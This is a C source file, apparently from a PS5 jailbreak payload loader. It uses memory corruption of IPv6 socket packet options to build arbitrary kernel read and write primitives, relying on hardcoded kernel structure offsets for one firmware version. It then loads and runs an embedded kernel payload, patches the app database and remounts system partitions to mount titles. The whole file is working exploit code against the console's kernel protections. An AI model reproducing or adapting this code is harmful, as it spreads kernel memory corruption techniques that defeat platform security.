/* Copyright (C) 2025 John Törnblom

This program is free software; you can redistribute it and/or modify it
under the terms of the GNU General Public License as published by the
Free Software Foundation; either version 3, or (at your option) any
later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; see the file COPYING. If not, see
<http://www.gnu.org/licenses/>.  */

#include <elf.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <dirent.h>

#include <sys/mman.h>
#include <sys/_iovec.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/sysctl.h>
#include <sys/user.h>

#include <machine/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <ps5/payload.h>
#include <ps5/kernel.h>
#include <ps5/klog.h>
#include "payload_bin.c"

int patch_app_db(void);
int sceKernelSetProcessName(const char *name);

/*
 * Set up IPv6 pktopts corruption on the rwpair sockets so that
 * prosper0gdb's kread8/kwrite20 work.
 *
 * The exploit (idlesauce) provides IPv6 socket FDs in rwpair but does NOT
 * set up the pktopts corruption that prosper0gdb expects. The exploit uses
 * a pipe-based kernel r/w mechanism instead. The PS5 SDK exposes this as
 * kernel_copyin/kernel_copyout, which we use here to set up the corruption.
 *
 * How the corruption works:
 *   master's ip6po_pktinfo pointer is overwritten to point at the memory
 *   location of victim's ip6po_pktinfo pointer field. Then:
 *   - setsockopt(master, IPV6_PKTINFO, {addr,...}) writes addr into
 *     victim's ip6po_pktinfo pointer
 *   - getsockopt(victim, IPV6_PKTINFO, buf) reads 20 bytes from addr
 *   This gives arbitrary kernel read (kread8) and write (kwrite20).
 *
 * Kernel structure offsets (same across PS5 FWs):
 *   proc + 0xbc   = p_pid
 *   proc + 0x48   = p_fd (filedesc*)
 *   fd + 0        = fd_ofiles
 *   ofiles + 8 + 48*n = file* for fd n
 *   file + 0      = f_data (socket*)
 *   socket + 24   = so_pcb (inpcb*)
 *   inpcb + 288   = in6p_outputopts (ip6_pktopts*)
 *   ip6_pktopts + 16 = ip6po_pktinfo (in6_pktinfo*)
 */
static int setup_ipv6_krw(payload_args_t *args) {
    int master_fd = args->rwpair[0];
    int victim_fd = args->rwpair[1];
    intptr_t kdata_base = args->kdata_base_addr;

    /* Determine allproc offset from firmware version */
    int mib[2] = {1, 46};
    size_t mib_size = 4;
    unsigned int fw_version = 0;
    sysctl(mib, 2, &fw_version, &mib_size, NULL, 0);

    intptr_t allproc_offset;
    switch(fw_version) {
    case 0x04030000: allproc_offset = 0x27edcb8; break;
    default:
        klog_printf("setup_ipv6_krw: unsupported FW 0x%08x\n", fw_version);
        return -1;
    }
    intptr_t allproc_addr = kdata_base + allproc_offset;

    /* Allocate pktinfo on both sockets via setsockopt.
     * This causes the kernel to allocate ip6_pktopts and in6_pktinfo
     * structs for each socket. */
    char pktinfo_buf[20] = {0};
    if(setsockopt(master_fd, IPPROTO_IPV6, IPV6_PKTINFO,
                  pktinfo_buf, sizeof(pktinfo_buf)) < 0) {
        klog_printf("setup_ipv6_krw: master setsockopt failed\n");
        return -2;
    }
    if(setsockopt(victim_fd, IPPROTO_IPV6, IPV6_PKTINFO,
                  pktinfo_buf, sizeof(pktinfo_buf)) < 0) {
        klog_printf("setup_ipv6_krw: victim setsockopt failed\n");
        return -3;
    }

    /* Find our proc struct by walking the allproc list */
    uint64_t proc = 0;
    kernel_copyout(allproc_addr, &proc, 8);
    pid_t mypid = getpid();
    while(proc) {
        int32_t pid = 0;
        kernel_copyout(proc + 0xbc, &pid, 4);
        if(pid == mypid) break;
        uint64_t next = 0;
        kernel_copyout(proc, &next, 8);
        proc = next;
    }
    if(!proc) {
        klog_printf("setup_ipv6_krw: proc not found for pid %d\n", mypid);
        return -4;
    }

    /* Traverse fd table -> socket -> inpcb -> ip6_pktopts */
    uint64_t fd_table = 0;
    kernel_copyout(proc + 0x48, &fd_table, 8);
    uint64_t ofiles = 0;
    kernel_copyout(fd_table, &ofiles, 8);

    /* Master socket */
    uint64_t master_file = 0;
    kernel_copyout(ofiles + 8 + 48 * master_fd, &master_file, 8);
    uint64_t master_data = 0;
    kernel_copyout(master_file, &master_data, 8);
    uint64_t master_pcb = 0;
    kernel_copyout(master_data + 24, &master_pcb, 8);
    uint64_t master_pktopts = 0;
    kernel_copyout(master_pcb + 288, &master_pktopts, 8);

    /* Victim socket */
    uint64_t victim_file = 0;
    kernel_copyout(ofiles + 8 + 48 * victim_fd, &victim_file, 8);
    uint64_t victim_data = 0;
    kernel_copyout(victim_file, &victim_data, 8);
    uint64_t victim_pcb = 0;
    kernel_copyout(victim_data + 24, &victim_pcb, 8);
    uint64_t victim_pktopts = 0;
    kernel_copyout(victim_pcb + 288, &victim_pktopts, 8);

    if(!master_pktopts || !victim_pktopts) {
        klog_printf("setup_ipv6_krw: pktopts NULL (m=0x%lx v=0x%lx)\n",
                     (unsigned long)master_pktopts,
                     (unsigned long)victim_pktopts);
        return -5;
    }

    /* Corrupt master's ip6po_pktinfo to point at victim's ip6po_pktinfo
     * field. ip6po_pktinfo is at offset 16 in ip6_pktopts. */
    uint64_t target = victim_pktopts + 16;
    kernel_copyin(&target, master_pktopts + 16, 8);

    klog_printf("setup_ipv6_krw: OK (m_opts=0x%lx v_opts=0x%lx)\n",
                 (unsigned long)master_pktopts, (unsigned long)victim_pktopts);
    return 0;
}

#define ROUND_PG(x) (((x) + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1))
#define TRUNC_PG(x) ((x) & ~(PAGE_SIZE - 1))
#define PFLAGS(x)   ((((x) & PF_R) ? PROT_READ  : 0) | \
		     (((x) & PF_W) ? PROT_WRITE : 0) | \
		     (((x) & PF_X) ? PROT_EXEC  : 0))

#define IOVEC_ENTRY(x) { (void*)(x), (x) ? strlen(x) + 1 : 0 }
#define IOVEC_SIZE(x)  (sizeof(x) / sizeof(struct iovec))

static int remount_system_ex(void) {
    struct iovec iov[] = {
        IOVEC_ENTRY("from"),      IOVEC_ENTRY("/dev/ssd0.system_ex"),
        IOVEC_ENTRY("fspath"),    IOVEC_ENTRY("/system_ex"),
        IOVEC_ENTRY("fstype"),    IOVEC_ENTRY("exfatfs"),
        IOVEC_ENTRY("large"),     IOVEC_ENTRY("yes"),
        IOVEC_ENTRY("timezone"),  IOVEC_ENTRY("static"),
        IOVEC_ENTRY("async"),     IOVEC_ENTRY(NULL),
        IOVEC_ENTRY("ignoreacl"), IOVEC_ENTRY(NULL),
    };
    return nmount(iov, IOVEC_SIZE(iov), MNT_UPDATE);
}

static int mount_nullfs(const char* src, const char* dst) {
    struct iovec iov[] = {
        IOVEC_ENTRY("fstype"), IOVEC_ENTRY("nullfs"),
        IOVEC_ENTRY("from"),   IOVEC_ENTRY(src),
        IOVEC_ENTRY("fspath"), IOVEC_ENTRY(dst),
    };
    return nmount(iov, IOVEC_SIZE(iov), 0);
}

static int bind_mount_title(const char* title_id, const char* src) {
    char dst[PATH_MAX];
    struct stat st;

    snprintf(dst, sizeof(dst), "/system_ex/app/%s/sce_sys", title_id);
    if (stat(dst, &st) == 0) {
        klog_printf("Title already mounted: %s\n", title_id);
        return 0;
    }

    snprintf(dst, sizeof(dst), "/system_ex/app/%s", title_id);
    if (unmount(dst, 0) != 0 && errno != EINVAL) {
        klog_perror("Failed to unmount partially mounted title");
    }

    if (mkdir(dst, 0755) && errno != EEXIST) {
        klog_perror("Failed to create mount directory for title");
        return -1;
    }

    if (mount_nullfs(src, dst) != 0) {
        klog_perror("Failed to bind mount title with mount_nullfs");
        return -1;
    }

    klog_printf("Title Mounted Successfully: %s -> %s\n", src, dst);
    return 0;
}

static int read_mount_link(const char* path, char* buf, size_t size) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        klog_perror("Failed to open mount.lnk file");
        return -1;
    }

    memset(buf, 0, size);
    ssize_t n = read(fd, buf, size - 1);
    if (n < 0) {
        klog_perror("Failed to read mount.lnk file");
        close(fd);
        return -1;
    }

    close(fd);
    return 0;
}

static int bind_mount_all_titles(const char* path) {
    char mountlnk[PATH_MAX];
    struct dirent *entry;
    struct stat st;
    DIR *dir = opendir(path);

    if (!dir) {
        klog_perror("Failed to open directory while binding mounts");
        return -1;
    }

    while ((entry = readdir(dir))) {
        if (strlen(entry->d_name) != 9) {
            continue;
        }

        snprintf(mountlnk, sizeof(mountlnk), "%s/%s/mount.lnk", path, entry->d_name);

        if (stat(mountlnk, &st) != 0) {
            continue;
        }

        if (read_mount_link(mountlnk, mountlnk, sizeof(mountlnk)) != 0) {
            klog_printf("Failed to read mount.lnk for title %s\n", entry->d_name);
            continue;
        }

        if (bind_mount_title(entry->d_name, mountlnk) != 0) {
            klog_printf("Failed to bind mount title %s -> %s\n", entry->d_name, mountlnk);
            continue;
        }

        klog_printf("Successfully mounted title %s -> %s\n", entry->d_name, mountlnk);
    }

    closedir(dir);
    return 0;
}

static int monitor_usb_changes(void) {
    struct kevent evt;
    int kq;

    if ((kq = kqueue()) < 0) {
        klog_perror("Failed to create kqueue");
        return -1;
    }

    EV_SET(&evt, 0, EVFILT_FS, EV_ADD | EV_CLEAR, 0, 0, 0);
    if (kevent(kq, &evt, 1, NULL, 0, NULL) < 0) {
        klog_perror("Failed to register usb event filter with kevent");
        close(kq);
        return -1;
    }

    while (1) {
        if (kevent(kq, NULL, 0, &evt, 1, NULL) < 0) {
            klog_perror("kevent wait failed while monitoring USB changes");
            break;
        }

        if (bind_mount_all_titles("/user/app") < 0) {
            klog_perror("Failed to bind mount /user/app titles after USB change");
        }
    }

    close(kq);
    return 0;
}

static void
pt_load(const void* image, void* base, Elf64_Phdr *phdr) {
  if(phdr->p_memsz && phdr->p_filesz) {
      memcpy(base + phdr->p_vaddr, image + phdr->p_offset, phdr->p_filesz);
  }
}

int main(void) {
	sceKernelSetProcessName("kstuff.elf");
    Elf64_Ehdr *ehdr = (Elf64_Ehdr*)___ps5_kstuff_payload_bin;
    Elf64_Phdr *phdr = (Elf64_Phdr*)(___ps5_kstuff_payload_bin + ehdr->e_phoff);
    Elf64_Shdr *shdr = (Elf64_Shdr*)(___ps5_kstuff_payload_bin + ehdr->e_shoff);
    void *base = (void*)0x0000000926100000;
    uintptr_t min_vaddr = -1;
    uintptr_t max_vaddr = 0;
    size_t base_size;

    // Compute size of virtual memory region.
    for(int i=0; i<ehdr->e_phnum; i++) {
        if(phdr[i].p_vaddr < min_vaddr) {
            min_vaddr = phdr[i].p_vaddr;
        }

        if(max_vaddr < phdr[i].p_vaddr + phdr[i].p_memsz) {
            max_vaddr = phdr[i].p_vaddr + phdr[i].p_memsz;
        }
    }
    min_vaddr = TRUNC_PG(min_vaddr);
    max_vaddr = ROUND_PG(max_vaddr);
    base_size = max_vaddr - min_vaddr;

    // allocate memory.
    if((base=mmap(base, base_size, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Parse program headers.
    for(int i=0; i<ehdr->e_phnum; i++) {
        switch(phdr[i].p_type) {
        case PT_LOAD:
            pt_load(___ps5_kstuff_payload_bin, base, &phdr[i]);
            break;
        }
    }

    // Set protection bits on mapped segments.
    for(int i=0; i<ehdr->e_phnum; i++) {
        if(phdr[i].p_type != PT_LOAD || phdr[i].p_memsz == 0) {
            continue;
        }
        if(mprotect(base + phdr[i].p_vaddr, ROUND_PG(phdr[i].p_memsz),
                    PFLAGS(phdr[i].p_flags))) {
            perror("mprotect");
            return EXIT_FAILURE;
        }
    }

    void (*entry)(payload_args_t*) = base + ehdr->e_entry;
    payload_args_t* args = payload_get_args();

    /* Set up IPv6 pktopts corruption so the kernel payload's
     * kread8/kwrite20 primitives work via the rwpair sockets. */
    int krw_rc = setup_ipv6_krw(args);
    if(krw_rc != 0) {
        klog_printf("WARNING: setup_ipv6_krw failed (%d)\n", krw_rc);
    }

    entry(args);
    if(*args->payloadout == 0) {
        puts("patching app.db");
        *args->payloadout = patch_app_db();
    }

    klog_printf("Remounting /system_ex and mounting titles...\n");
    remount_system_ex();
    bind_mount_all_titles("/user/app");

    monitor_usb_changes();

    return 0; 
}
